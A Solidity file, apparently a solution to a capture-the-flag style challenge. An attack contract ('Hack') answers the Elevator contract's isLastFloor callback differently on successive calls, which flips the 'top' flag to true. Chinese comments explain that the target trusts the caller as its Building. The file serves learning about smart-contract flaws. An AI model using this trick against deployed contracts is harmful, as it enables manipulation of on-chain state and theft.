// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    contract Hack {
        Elevator private immutable target;
        uint private count=0;
        constructor(address _target){
            target=Elevator(_target);
        }
        function pwn()external {
            target.goTo(1);
            require(target.top(),"not top");
        }
        function isLastFloor(uint) external returns (bool){
            count++;
            return count>1;
        }
        
    }


interface Building {
  function isLastFloor(uint) external returns (bool);
}
//这边这个合约的接口是一个判断是不是顶楼的，这边其实不重要
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);
//这边给Building的接口了一个地址--就是攻击合约的地址
    if (! building.isLastFloor(_floor)) {//由于这里没有对这个函数定义，所以自己写一个合约来进行攻击
      floor = _floor;
      top = building.isLastFloor(floor);//这题判断是不是成功就是看这个地方top的值是不是true
    }
  }
}